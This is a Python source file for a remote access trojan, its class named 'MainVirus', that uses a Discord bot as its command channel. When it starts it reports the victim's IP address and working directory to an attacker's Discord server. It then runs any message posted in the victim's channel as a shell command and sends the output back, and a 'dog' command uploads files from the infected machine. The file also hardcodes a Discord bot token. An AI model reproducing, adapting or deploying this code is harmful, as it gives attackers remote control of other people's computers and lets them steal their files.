import lightbulb, hikari, asyncio, os, random, socket, subprocess, \
    sys, requests, json  # installs the import we will need for making the bot
from parser import Parser
from requests_toolbelt.multipart.encoder import MultipartEncoder
from pathlib import Path
import base64


class MainVirus:  # Making a class to wrap code cause organisation
    def __init__(self):  # initialisation function
        self.bot = self.make_connection()  # Creates the discord bot
        self.id = self.make_id()  # Contains the id of the victim's computer
        self.channel_id = None
        self.cwd = os.getcwd()
        self.funList = {
            "exit": self.exit,
            "cdir": self.cd,
            "dog": self.cat,
        }

    def run(self):  # runs the program
        self.connectionSetUp()
        self.commands()
        self.bot.run()

    def make_connection(self):  # makes a connection to the discord servers
        try:  # I use a try method cause the person might not have an internet connection when computer booted
            return lightbulb.BotApp(
                token="OTg1ODU1NTYwMDMxMjkzNDQy.GkeK8U.11OUYRHcS5Zevhu3B8QrMDZ6HdRgJZtDOZdEcY",
                default_enabled_guilds=985853825166475284)  # I connect the bot to the discord servers using our bots token
        except:  # what to do if connection fails
            self.make_connection()  # I run the program again if the connection fails

    def make_id(self):
        return random.randint(100, 999)

    def connectionSetUp(self):
        @self.bot.listen(hikari.StartedEvent)
        async def onStart(event):
            await self.bot.rest.create_message(
                985853985577635910,
                f"{'-' * 20}\n"
                f"@everyone **CONNECTION MADE :P**\n"
                f"**ID: **||{self.id}||\n"
                f"**IP: **||{socket.gethostbyname(socket.gethostname())}||\n"
                f"**CWD: **||{os.getcwd()}||\n"
                f"{'-' * 20}\n"
            )
            await self.bot.rest.create_guild_text_channel(name=str(self.id), guild=985853825166475284)

    def commands(self):
        @self.bot.command
        @lightbulb.command("test", "testing command")
        @lightbulb.implements(lightbulb.SlashCommand)
        async def ping(ctx):
            await ctx.respond("working")

        @self.bot.listen(hikari.GuildMessageCreateEvent)
        async def onMessage(event):
            if event.content == str(self.id):
                self.channel_id = event.channel_id
            if event.channel_id == self.channel_id and str(event.author) != "rshellbot#7986":
                await self.bot.rest.create_message(self.channel_id, self.giveMessage(event))

    def giveMessage(self, event):
        if self.readInput(event.content, event):
            return self.readInput(event.content, event)
        elif self.readInput(event.content, event) != "":
            return self.readInput(event.content, event)
        else:
            return "[null]"

    def cat(self, syntax):
        @self.bot.listen(hikari.GuildMessageCreateEvent)
        async def onConfirm(event):
            if self.isCommandConfirm(event, "dog"):
                await self.bot.rest.create_message(self.channel_id, f"Sending File: {syntax[0]}")
                fileLoc = os.path.join(self.cwd, syntax[0])
                await self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))

    def exit(self, syntax):
        @self.bot.listen(hikari.GuildMessageCreateEvent)
        async def onConfirm(event):
            if self.isCommandConfirm(event, "exit"):
                await self.bot.rest.create_message(self.channel_id, "Closing Connection")
                await self.bot.rest.create_message(
                    985853985577635910,
                    f"{'-' * 20}\n"
                    f"@everyone **CONNECTION LOST :(**\n"
                    f"**ID: **||{self.id}||\n"
                    f"**IP: **||{socket.gethostbyname(socket.gethostname())}||\n"
                    f"**CWD: **||{os.getcwd()}||\n"
                    f"{'-' * 20}\n"
                )
                await self.bot.rest.delete_channel(self.channel_id)
                sys.exit()

    def isCommandConfirm(self, event, keyword):
        if event.channel_id == self.channel_id and str(event.author) != "rshellbot#7986" and event.content == keyword:
            return True
        else:
            return False

    def cd(self, syntax):
        @self.bot.listen(hikari.GuildMessageCreateEvent)
        async def onConfirm(event):
            if self.isCommandConfirm(event, "cdir"):
                self.cwd = syntax[0]
                await self.bot.rest.create_message(self.channel_id, f"Set cwd to {self.cwd}")

    def readInput(self, inpit, event):
        print(inpit)
        def out(command):
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True,
                                    shell=True, cwd=self.cwd)
            return result.stdout

        if str(inpit).__contains__("<"):
            fun = inpit.strip("<")
            parsed = Parser(fun).run()
            self.funList[parsed[0]](parsed[1])
            return "[running command]"
        else:
            return out(inpit)


MainVirus().run()
